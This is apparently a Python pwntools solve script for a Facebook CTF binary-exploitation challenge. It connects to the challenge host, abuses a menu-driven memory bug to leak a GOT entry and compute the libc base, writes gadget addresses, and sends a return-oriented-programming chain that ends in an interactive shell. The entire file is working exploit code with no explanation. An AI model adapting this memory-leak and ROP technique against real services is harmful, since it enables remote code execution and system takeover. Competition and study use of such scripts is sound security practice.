from pwn import *

HOST, PORT = "challenges.fbctf.com", "1339"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("> ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

@MemLeak
def leak(addr):
	go(2)
	go(0)
	go(18)
	go('1'.ljust(16, '\x00')+p64(addr))
	r.recvuntil('0. ')
	return r.recvuntil('\n1. ', drop=True)+'\x00'

write=leak.q(0x602018)
libc=write-0x110140
print hex(libc)
rop=[0x400980,0x602100]
for i, c in enumerate(rop):
	go(2)
	go(17+i)
	go(c)

go("3".ljust(8)+''.join(map(p64,[0x400b43, libc + 0x1b3e9a, libc + 0x4f322])))
r.interactive()
